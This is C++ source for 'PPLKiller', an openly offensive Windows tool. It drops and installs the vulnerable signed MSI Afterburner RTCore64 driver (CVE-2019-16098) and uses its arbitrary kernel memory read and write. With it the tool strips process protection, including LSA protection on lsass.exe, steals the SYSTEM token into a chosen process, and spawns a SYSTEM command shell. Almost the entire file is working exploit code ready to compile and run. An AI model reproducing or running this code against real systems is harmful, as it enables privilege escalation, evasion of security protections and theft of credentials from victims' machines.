// CODE FROM
// https://github.com/Barakat/CVE-2019-16098
// https://github.com/gentilkiwi/mimikatz
// https://github.com/TarlogicSecurity/EoPLoadDriver/

#include <Windows.h>
#include <aclapi.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <cstdio>

#include <Shlobj.h>
#include <Shlobj_core.h>
#include <string_view>

#include "resource.h"
#include "loaddriver.h"

#define AUTHOR L"@aceb0nd"
#define VERSION L"0.3"

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif

// Micro-Star MSI Afterburner driver arbitrary read and write primitive
// These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code.

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


// END driver comms code
// START Mimikatz driver install/uninstall code

BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
    BOOL status = FALSE;
    DWORD dwSizeNeeded;
    PSECURITY_DESCRIPTOR oldSd, newSd;
    SECURITY_DESCRIPTOR dummySdForXP;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    EXPLICIT_ACCESS ForEveryOne = {
        SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
        SET_ACCESS,
        NO_INHERITANCE,
        {NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
    };
    if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
        if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
            if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
                if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
                    if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
                        status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }
                    FreeSid(ForEveryOne.Trustee.ptstrName);
                }
            }
            LocalFree(oldSd);
        }
    }
    return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    BOOL status = FALSE;
    SC_HANDLE hSC = NULL, hS = NULL;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
        if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
            wprintf(L"[+] \'%s\' service already registered\n", serviceName);
        }
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                wprintf(L"[*] \'%s\' service not present\n", serviceName);
                if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
                    wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
                    if (status = kull_m_service_addWorldToSD(hS))
                        wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
                    else printf("kull_m_service_addWorldToSD");
                }
                else PRINT_ERROR_AUTO(L"CreateService");
            }
            else PRINT_ERROR_AUTO(L"OpenService");
        }
        if (hS) {
            if (startIt) {
                if (status = StartService(hS, 0, NULL))
                    wprintf(L"[+] \'%s\' service started\n", serviceName);
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                    wprintf(L"[*] \'%s\' service already started\n", serviceName);
                else {
                    PRINT_ERROR_AUTO(L"StartService");
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    else {
        PRINT_ERROR_AUTO(L"OpenSCManager(create)");
        return GetLastError();
    }
    return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
    BOOL status = FALSE;
    SC_HANDLE hSC, hS;
    SERVICE_STATUS serviceStatus;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
            status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
    if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
        wprintf(L"[+] \'%s\' service stopped\n", serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
        wprintf(L"[*] \'%s\' service not running\n", serviceName);
    }
    else {
        PRINT_ERROR_AUTO(L"kull_m_service_stop");
        return FALSE;
    }

    if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
            BOOL status = DeleteService(hS);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return TRUE;
}

// END Mimikatz code

void Log(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}

unsigned long long getKernelBaseAddr() {
    DWORD out = 0;
    DWORD nb = 0;
    PVOID* base = NULL;
    if (EnumDeviceDrivers(NULL, 0, &nb)) {
        base = (PVOID*)malloc(nb);
        if (EnumDeviceDrivers(base, nb, &out)) {
            return (unsigned long long)base[0];
        }
    }
    return NULL;
}

int processPIDByName(const WCHAR* name) {
    int pid = 0;

    // Create a snapshot of currently running processes
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // Some error handling in case we failed to get a snapshot of running processes
    if (snap == INVALID_HANDLE_VALUE) {
        PRINT_ERROR_AUTO(L"processPIDByName");
        return 0;
    }

    // Declare a PROCESSENTRY32 class
    PROCESSENTRY32 pe32;
    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process and exit if unsuccessful
    if (!Process32First(snap, &pe32)) {
        PRINT_ERROR_AUTO(L"processPIDByName");
        CloseHandle(snap);          // clean the snapshot object
    }

    do {
        if (wcscmp(pe32.szExeFile, name) == 0) {
            pid = pe32.th32ProcessID;
        }

    } while (Process32Next(snap, &pe32));

    // Clean the snapshot object to prevent resource leakage
    CloseHandle(snap);
    return pid;

}

struct Offsets {
    DWORD64 UniqueProcessIdOffset;
    DWORD64 ActiveProcessLinksOffset;
    DWORD64 TokenOffset;
    DWORD64 SignatureLevelOffset;
};

void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Log("[!] Unable to obtain a handle to the device object");
        return;
    }
    Log("[*] Device object handle has been obtained");

    const auto NtoskrnlBaseAddress = getKernelBaseAddr();
    Log("[*] Ntoskrnl base address: %p", NtoskrnlBaseAddress);

    // Locating PsInitialSystemProcess address
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsInitialSystemProcessOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    Log("[*] PsInitialSystemProcess address: %p", PsInitialSystemProcessAddress);

    // Find our process in active process list
    const DWORD64 TargetProcessId = static_cast<DWORD64>(targetPID);
    DWORD64 ProcessHead = PsInitialSystemProcessAddress + offsets.ActiveProcessLinksOffset;
    DWORD64 CurrentProcessAddress = ProcessHead;

    do {
        const DWORD64 ProcessAddress = CurrentProcessAddress - offsets.ActiveProcessLinksOffset;
        const auto UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddress + offsets.UniqueProcessIdOffset);
        if (UniqueProcessId == TargetProcessId) {
            break;
        }
        CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddress + offsets.ActiveProcessLinksOffset);
    } while (CurrentProcessAddress != ProcessHead);
    CurrentProcessAddress -= offsets.ActiveProcessLinksOffset;
    Log("[*] Current process address: %p", CurrentProcessAddress);

    // Patches 5 values  SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer
    WriteMemoryPrimitive(Device, 4, CurrentProcessAddress + offsets.SignatureLevelOffset, 0x00);

    // Cleanup
    CloseHandle(Device);
}

void makeSYSTEM(DWORD targetPID, Offsets offsets) {
    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Log("[!] Unable to obtain a handle to the device object");
        return;
    }
    Log("[*] Device object handle has been obtained");

    const auto NtoskrnlBaseAddress = getKernelBaseAddr();
    Log("[*] Ntoskrnl base address: %p", NtoskrnlBaseAddress);

    // Locating PsInitialSystemProcess address
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsInitialSystemProcessOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    Log("[*] PsInitialSystemProcess address: %p", PsInitialSystemProcessAddress);

    // Get token value of System process
    const DWORD64 SystemProcessToken = ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.TokenOffset) & ~15;
    Log("[*] System process token: %p", SystemProcessToken);

    // Find our process in active process list
    const DWORD64 CurrentProcessId = static_cast<DWORD64>(targetPID);
    DWORD64 ProcessHead = PsInitialSystemProcessAddress + offsets.ActiveProcessLinksOffset;
    DWORD64 CurrentProcessAddress = ProcessHead;

    do {
        const DWORD64 ProcessAddress = CurrentProcessAddress - offsets.ActiveProcessLinksOffset;
        const auto UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddress + offsets.UniqueProcessIdOffset);
        if (UniqueProcessId == CurrentProcessId) {
            break;
        }
        CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddress + offsets.ActiveProcessLinksOffset);
    } while (CurrentProcessAddress != ProcessHead);

    CurrentProcessAddress -= offsets.ActiveProcessLinksOffset;
    Log("[*] Current process address: %p", CurrentProcessAddress);

    // Reading current process token
    const DWORD64 CurrentProcessFastToken = ReadMemoryDWORD64(Device, CurrentProcessAddress + offsets.TokenOffset);
    const DWORD64 CurrentProcessTokenReferenceCounter = CurrentProcessFastToken & 15;
    const DWORD64 CurrentProcessToken = CurrentProcessFastToken & ~15;
    Log("[*] Current process token: %p", CurrentProcessToken);

    // Stealing System process token
    Log("[*] Stealing System process token ...");
    WriteMemoryDWORD64(Device, CurrentProcessAddress + offsets.TokenOffset, CurrentProcessTokenReferenceCounter | SystemProcessToken);

    // Cleanup
    CloseHandle(Device);
}

void spawnCmd(void) {
    Log("[*] Spawning new shell ...");

    STARTUPINFOW StartupInfo{};
    StartupInfo.cb = sizeof(StartupInfo);
    PROCESS_INFORMATION ProcessInformation;

    CreateProcessW(LR"(C:\Windows\System32\cmd.exe)",
        nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr,
        &StartupInfo,
        &ProcessInformation);

    WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
}

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
    case 1607:
        return Offsets{ 0x02e8, 0x02f0, 0x0358, 0x06c8 };
    case 1803:
    case 1809:
        return Offsets{ 0x02e0, 0x02e8, 0x0358, 0x06c8 };
    case 1903:
    case 1909:
        return Offsets{ 0x02e8, 0x02f0, 0x0360, 0x06f8 };
    case 2004:
    case 2009:
        return Offsets{ 0x0440, 0x0448, 0x04b8, 0x0878 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");
        // Previously this returned an empty struct, which could (would?) cause the OS to crash and burn. Hopefully just an exit is ok.
        exit(-1);
    }

}

int fileExists(TCHAR* file)
{
    WIN32_FIND_DATA FindFileData;
    HANDLE handle = FindFirstFile(file, &FindFileData);
    int found = handle != INVALID_HANDLE_VALUE;
    if (found)
    {
        //FindClose(&handle); this will crash
        FindClose(handle);
    }
    return found;
}

WCHAR* GetUserLocalTempPath() {
    //static constexpr std::wstring_view temp_label = L"\\Temp\\";
    HWND folder_handle = { 0 };
    WCHAR *temp_path = (WCHAR*)malloc(sizeof(WCHAR) * MAX_PATH);
    if (temp_path == NULL) {
        return NULL;
    }
    auto get_folder = SHGetFolderPath(folder_handle, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_DEFAULT, temp_path);
    if (get_folder == S_OK) {
        // const wchar_t driverName[] = L"\\RTCore64.sys";
        wcscat_s(temp_path, MAX_PATH, L"\\Temp\\RTCore64.sys");
        //input_parameter = static_cast<const wchar_t*>(temp_path);
        //input_parameter.append(temp_label);
        CloseHandle(folder_handle);
        return temp_path;
    }
    return NULL;
}

BOOL GetResourcePointer(HINSTANCE Instance, LPCTSTR ResName, LPCTSTR ResType, LPVOID* ppRes, DWORD* pdwResSize) {
    // Check the pointers to which we want to write
    if (ppRes && pdwResSize) {
        HRSRC hRsrc;
        // Find the resource ResName of type ResType in the DLL/EXE described by Instance
        if (hRsrc = FindResource((HMODULE)Instance, ResName, ResType)) {
            HGLOBAL hGlob;
            // Make sure it's in memory ...
            if (hGlob = LoadResource(Instance, hRsrc)) {
                // Now lock it to get a pointer
                *ppRes = LockResource(hGlob);
                // Also retrieve the size of the resource
                *pdwResSize = SizeofResource(Instance, hRsrc);
                // Return TRUE only if both succeeded
                return (*ppRes && *pdwResSize);
            }
        }
    }
    // Failure means don't use the values in *ppRes and *pdwResSize
    return FALSE;
}

WCHAR* dropDriver() {
    //get driver
    LPVOID RTCoreDriver;
    DWORD driverSize;
    if (GetResourcePointer(NULL, MAKEINTRESOURCE(IDR_RT_RCDATA1), RT_RCDATA, &RTCoreDriver, &driverSize) == FALSE) {
        wprintf(L"GetResourcePointer failed\n");
        return FALSE;
    }

    auto tempPath = GetUserLocalTempPath();
    if (fileExists(tempPath)) {
        return tempPath;
    }

    HANDLE hFile = CreateFile(tempPath,                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template
    if (hFile == INVALID_HANDLE_VALUE)
    {

        wprintf(L"Unable to open file \"%s\" for write.\n", tempPath);
        return NULL;
    }

    BOOL bErrorFlag = FALSE;
    DWORD dwBytesWritten = 0;

    bErrorFlag = WriteFile(
        hFile,           // open file handle
        RTCoreDriver,      // start of data to write
        driverSize,  // number of bytes to write
        &dwBytesWritten, // number of bytes that were written
        NULL);            // no overlapped structure

    if (FALSE == bErrorFlag)
    {
        wprintf(L"Terminal failure: Unable to write to file.\n");
    }
    else
    {
        if (dwBytesWritten != driverSize)
        {
            // This is an error because a synchronous write that results in
            // success (WriteFile returns TRUE) should write all data as
            // requested. This would not necessarily be the case for
            // asynchronous writes.
            wprintf(L"Error: dwBytesWritten != dwBytesToWrite\n");
        }
        else
        {
            wprintf(L"Wrote %d bytes to %s successfully.\n", dwBytesWritten, tempPath);
        }
    }
    CloseHandle(hFile);
    return tempPath;
    
}


int wmain(int argc, wchar_t* argv[]) {

    wprintf(L"PPLKiller version %ws by %ws\n", VERSION, AUTHOR);

    if (argc < 2) {
        wprintf(L"Usage: %s\n"
            " [/disablePPL <PID>]\n"
            " [/disableLSAProtection]\n"
            " [/makeSYSTEM <PID>]\n"
            " [/makeSYSTEMcmd]\n"
            " [/installDriver]\n"
            " [/uninstallDriver]", argv[0]);
        return 0;
    }


    const auto svcName = L"RTCore64";

    if (wcscmp(argv[1] + 1, L"disablePPL") == 0 && argc == 3) {
        Offsets offsets = getVersionOffsets();
        auto PID = _wtoi(argv[2]);
        disableProtectedProcesses(PID, offsets);
    }
    else if (wcscmp(argv[1] + 1, L"disableLSAProtection") == 0) {
        Offsets offsets = getVersionOffsets();
        auto lsassPID = processPIDByName(L"lsass.exe");
        disableProtectedProcesses(lsassPID, offsets);
    }
    else if (wcscmp(argv[1] + 1, L"makeSYSTEM") == 0 && argc == 3) {
        Offsets offsets = getVersionOffsets();
        auto PID = _wtoi(argv[2]);
        makeSYSTEM(PID, offsets);
    }
    else if (wcscmp(argv[1] + 1, L"makeSYSTEMcmd") == 0) {
        Offsets offsets = getVersionOffsets();
        makeSYSTEM(GetCurrentProcessId(), offsets);
        spawnCmd();
    }
    else if (wcscmp(argv[1] + 1, L"installDriver") == 0) {
        WCHAR* driverPath = dropDriver();
        const auto svcDesc = L"Micro-Star MSI Afterburner";
        if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
            wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
        }
    }
    else if (wcscmp(argv[1] + 1, L"installDriverSeDebugOnly") == 0) {
        WCHAR* driverPath = dropDriver();
        wchar_t key[] = L"System\\CurrentControlSet\\RTCore64";
        fullsend(key, driverPath);
    }
    else if (wcscmp(argv[1] + 1, L"uninstallDriver") == 0) {
        service_uninstall(svcName);
        auto tempPath = GetUserLocalTempPath();
        if (DeleteFile(tempPath) != 0) {
            wprintf(L"Deleted %s\n", tempPath);
        }
    }
    else {
        wprintf(L"Error: Check the help\n");
    }

    return 0;
}
